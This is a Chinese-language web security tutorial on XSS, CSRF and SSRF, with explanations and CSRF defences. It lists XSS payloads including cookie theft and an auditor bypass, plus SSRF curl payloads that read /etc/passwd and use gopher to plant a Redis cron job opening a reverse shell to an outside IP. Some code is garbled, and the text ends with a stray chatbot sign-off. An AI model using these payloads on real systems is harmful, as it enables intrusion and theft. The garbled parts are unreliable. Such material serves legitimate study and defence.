# Web-Sec Documentation, 发布 1.0

## 4.2 XSS 攻击

### 4.2.9 示例
```php
// index.php
Preview
var d = atob('');
var cleanvar = DOMPurify.sanitize(d);
document.write(cleanvar);

// payload
&lt;script&gt;alert(1)&lt;/script&gt;'>
```

### 4.2.10 Payload
#### 常用 Payload
- `<script>alert(1)</script>`
- `"><script>alert(1)</script>`
- `'><script>alert(1)</script>`

#### 大小写绕过
- `<ScRiPt>alert(1);</sCrIpT>`
- `<SCRIPT>alert('XSS');</SCRIPT>`

#### 各种 alert 方式
- `javascript:alert(1)`
- `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`
- `vbscript:msgbox(1)`

#### 伪协议
- `javascript:alert(document.cookie)`
- `vbscript:alert(document.cookie)`

#### Chrome XSS 审计器绕过
- `?param=https://&param=@z.exeye.io/import%20rel=import%3E`

#### 长度限制
- 使用简短的 Payload，如 `onerror=alert(1)`

### 4.2.11 持久化
#### 基于存储
某些网站会将信息存储在 Cookie 或 localStorage 中。由于这些数据通常是网站主动存储的，很多时候没有对其中的数据进行过滤，直接取出并展示在页面中，甚至存在 `eval(data)` 的调用。因此，当有一个 XSS 漏洞时，攻击者可以将 Payload 写入其中，在特定条件下触发。

在某些情况下，特殊字符可能导致问题，可以使用 `String.fromCharCode` 来绕过。

#### Service Worker
Service Worker 可以拦截 HTTP 请求，起到类似本地代理的作用。攻击者可以使用 Service Worker Hook 一些请求，在请求中返回攻击代码，实现持久化攻击。

在 Chrome 中，可以通过 `chrome://inspect/#service-workers` 查看 Service Worker 的状态，并进行停止。

#### AppCache
在可控的网络环境下（如公共 Wi-Fi），可以使用 AppCache 机制强制存储一些 Payload。在未清除的情况下，用户访问站点时对应的 Payload 会一直存在。

### 4.2.12 参考链接
- [AwesomeXSS](https://github.com/0xInfection/AwesomeXSS)
- [W3C](https://www.w3.org/)
- [DOM XSS Wiki](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [Content Security Policy](https://content-security-policy.com/)
- [Markdown XSS](https://owasp.org/www-community/attacks/XSS_Filter_Evasion_Cheat_Sheet#markdown_xss)
- [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [HTML5 Security Cheatsheet](https://html5sec.org/)
- [HTTP Security Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)

### 4.3 CSRF
#### 4.3.1 简介
跨站请求伪造 (Cross-Site Request Forgery, CSRF)，也被称为 One Click Attack 或者 Session Riding，是一种对网站的恶意利用。尽管听起来像 XSS，但它与 XSS 非常不同。XSS 利用站点内的信任用户，而 CSRF 通过伪装来自受信任用户的请求来利用受信任的网站。

#### 4.3.2 分类
##### 资源包含
资源包含是大多数介绍 CSRF 概念的演示或基础课程中可能看到的类型。这种类型归结为控制 HTML 标签（例如 `<img>`、`<iframe>`、`<link>`、`<script>` 等）所包含的资源的攻击者。如果攻击者能够影响 URL 被加载的话，包含远程资源的任何标签都可以完成攻击。

由于缺少对 Cookie 的源点检查，此攻击不需要 XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于 GET 请求，因为这些是浏览器对资源 URL 唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的 HTTP 请求方式。

##### 基于表单
通常在正确使用安全的请求方式时看到。攻击者创建一个想要受害者提交的表单，其包含一个 JavaScript 片段，强制受害者的浏览器提交。该表单可以完全由隐藏的元素组成，以致受害者很难发现它。

如果处理 cookies 不当，攻击者可以在任何站点上发动攻击，只要受害者使用有效的 cookie 登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。

##### XMLHttpRequest
基于 XHR 的 CSRF 通常由于 SOP 而以 XSS 有效载荷的形式出现。没有跨域资源共享策略 (CORS)，XHR 仅限于攻击者托管自己的有效载荷的原始请求。这种类型的 CSRF 的攻击有效载荷基本上是一个标准的 XHR，攻击者已经找到了一些注入受害者浏览器 DOM 的方式。

#### 4.3.3 防御
- 通过 CSRF-token 或验证码来检测用户提交
- 验证 Referer/Content-Type
- 对于用户修改删除等操作最好都使用 POST 操作
- 避免全站通用的 Cookie，严格设置 Cookie 的域

#### 4.3.4 参考链接
- [Demo](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)
- [Wiping Out CSRF](https://paragonie.com/blog/2016/03/preventing-csrf-attacks-x-requested-with-header-not-enough)
- [Neat Tricks to Bypass CSRF Protection](https://portswigger.net/research/csrf-without-samesite-double-submit-cookies)

### 4.4 SSRF
#### 4.4.1 简介
服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF 攻击通常针对外部网络无法直接访问的内部系统。

#### 4.4.2 利用方式
SSRF 利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。以 curl 为例，可以使用 dict 协议操作 Redis、file 协议读文件、gopher 协议反弹 Shell 等功能，常见的 Payload 如下：
```sh
curl -vvv 'dict://127.0.0.1:6379/info'
curl -vvv 'file:///etc/passwd'
curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d
,!%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/
,!6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d
,!%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d
,!%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit
,!%0d%0a'
```

#### 4.4.3 相关危险函数
SSRF 涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以 PHP 为例，涉及到的函数有 `file_get_contents()`、`fsockopen()` 和 `curl_exec()` 等。

#### 4.4.4 过滤绕过
更改 IP 地址写法，如使用十进制表示法或其他变体。

希望这些优化后的文本能帮助你更好地理解和应用相关知识。